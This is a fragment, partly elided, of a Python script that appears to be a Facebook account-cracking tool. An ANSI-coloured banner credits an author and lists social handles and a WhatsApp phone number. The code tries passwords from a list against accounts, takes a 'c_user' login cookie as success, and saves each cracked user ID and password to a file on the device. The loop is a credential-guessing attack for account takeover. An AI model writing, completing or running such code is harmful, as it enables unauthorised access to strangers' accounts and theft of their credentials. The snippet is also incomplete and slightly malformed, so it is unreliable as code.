...
\33[1;92m  ────────────────────────────────────────────────────────────────────────────────────────────────────
\33[1;91m╔════════════════════════════════════════╗
\33[1;92m║[•] Author    : sabbir
\33[1;92m║[•] Facebook  : ক্রাঁশঁ বঁয়ঁ
\33[1;92m║[•] Whatsapp  : 01318506905
\33[1;92m║[•] Github    : GITHUB-rahi3331
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/sabbir-OK.txt', 'a').write( uid+' | '+ps+'\y')
                oks.append(uid)
                break
